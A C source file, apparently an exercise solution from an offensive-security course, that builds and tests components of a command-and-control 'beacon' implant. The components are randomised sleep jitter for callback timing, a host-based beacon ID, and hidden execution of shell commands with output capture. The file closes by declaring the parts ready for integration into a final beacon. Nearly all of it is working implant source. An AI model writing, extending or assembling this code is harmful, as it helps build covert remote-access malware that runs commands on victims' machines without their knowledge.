/*
 * Solution: Exercise 02 - Test Beacon Components
 */

#include <windows.h>
#include <stdio.h>

// Calculate sleep time with jitter
DWORD CalculateJitterSleep(DWORD baseTime, DWORD jitterPercent) {
    if (jitterPercent == 0) return baseTime;
    if (jitterPercent > 100) jitterPercent = 100;

    // Calculate jitter range (e.g., 30% of 5000 = 1500)
    DWORD jitterRange = (baseTime * jitterPercent) / 100;

    // Generate random offset in range [-jitterRange, +jitterRange]
    DWORD randomOffset = rand() % (jitterRange * 2);
    DWORD jitter = randomOffset - jitterRange;

    return baseTime + jitter;
}

// Generate unique beacon ID
VOID GenerateBeaconId(CHAR* buffer, SIZE_T bufferSize) {
    CHAR computerName[256];
    DWORD nameSize = sizeof(computerName);

    if (!GetComputerNameA(computerName, &nameSize)) {
        strcpy_s(computerName, sizeof(computerName), "UNKNOWN");
    }

    DWORD pid = GetCurrentProcessId();
    DWORD timestamp = GetTickCount();

    snprintf(buffer, bufferSize, "%s_%u_%u", computerName, pid, timestamp);
}

// Execute command and capture output
BOOL ExecuteCommand(const CHAR* command, CHAR* output, DWORD outputSize) {
    // Create pipe for stdout
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return FALSE;
    }

    // Make read end non-inheritable
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    // Setup startup info
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    // Create process
    PROCESS_INFORMATION pi = {0};

    CHAR cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", command);

    BOOL success = CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    // Close write end in parent
    CloseHandle(hWritePipe);

    // Read output
    DWORD totalRead = 0;
    CHAR buffer[4096];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalRead + bytesRead >= outputSize - 1) {
            bytesRead = outputSize - totalRead - 1;
        }

        memcpy(output + totalRead, buffer, bytesRead);
        totalRead += bytesRead;

        if (totalRead >= outputSize - 1) {
            break;
        }
    }

    output[totalRead] = '\0';

    // Wait for process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return TRUE;
}

// Test jitter calculation
VOID TestJitter(void) {
    printf("[*] Test 1: Jitter Calculation\n");

    DWORD baseTime = 5000;
    DWORD jitter = 30;

    printf("    Base time: %u ms\n", baseTime);
    printf("    Jitter:    %u%%\n\n", jitter);
    printf("    10 random sleep times:\n");

    for (int i = 0; i < 10; i++) {
        DWORD sleepTime = CalculateJitterSleep(baseTime, jitter);
        int diff = (int)sleepTime - (int)baseTime;
        float percent = ((float)diff / baseTime) * 100.0f;

        printf("    %2d: %5u ms (%+5d ms, %+6.1f%%)\n",
               i + 1, sleepTime, diff, percent);
    }

    DWORD minExpected = (DWORD)(baseTime * 0.7);
    DWORD maxExpected = (DWORD)(baseTime * 1.3);
    printf("\n    Expected range: %u - %u ms\n\n", minExpected, maxExpected);
}

// Test beacon ID generation
VOID TestBeaconId(void) {
    printf("[*] Test 2: Beacon ID Generation\n");

    CHAR beaconId[256];
    GenerateBeaconId(beaconId, sizeof(beaconId));

    printf("    Generated ID: %s\n", beaconId);
    printf("    Length:       %zu bytes\n\n", strlen(beaconId));

    printf("    Testing uniqueness (3 IDs with 100ms delay):\n");
    for (int i = 0; i < 3; i++) {
        CHAR id[256];
        GenerateBeaconId(id, sizeof(id));
        printf("    %d: %s\n", i + 1, id);
        Sleep(100);
    }
    printf("\n");
}

// Test command execution
VOID TestCommandExecution(void) {
    printf("[*] Test 3: Command Execution\n\n");

    const CHAR* commands[] = {
        "whoami",
        "hostname",
        "echo Test output",
        "dir C:\\Windows\\System32\\notepad.exe"
    };

    for (int i = 0; i < 4; i++) {
        printf("    Command: %s\n", commands[i]);

        CHAR output[4096];
        memset(output, 0, sizeof(output));

        if (ExecuteCommand(commands[i], output, sizeof(output))) {
            printf("    Success! Output (%zu bytes):\n", strlen(output));

            // Print first 200 chars
            if (strlen(output) > 200) {
                CHAR preview[201];
                memcpy(preview, output, 200);
                preview[200] = '\0';
                printf("    %s...\n", preview);
            } else {
                printf("    %s", output);
                if (output[strlen(output) - 1] != '\n') {
                    printf("\n");
                }
            }
        } else {
            printf("    [!] Failed to execute\n");
        }
        printf("\n");
    }
}

int main(void) {
    printf("[*] Solution: Beacon Component Testing\n\n");

    // Seed random number generator
    srand(GetTickCount());

    // Run tests
    TestJitter();
    TestBeaconId();
    TestCommandExecution();

    printf("[+] All tests completed successfully!\n\n");

    printf("[*] Component Status:\n");
    printf("    [+] Jitter calculation: Working\n");
    printf("    [+] Beacon ID generation: Working\n");
    printf("    [+] Command execution: Working\n");
    printf("    [+] Output capture: Working\n\n");

    printf("[*] Ready for integration into final beacon!\n\n");

    return 0;
}
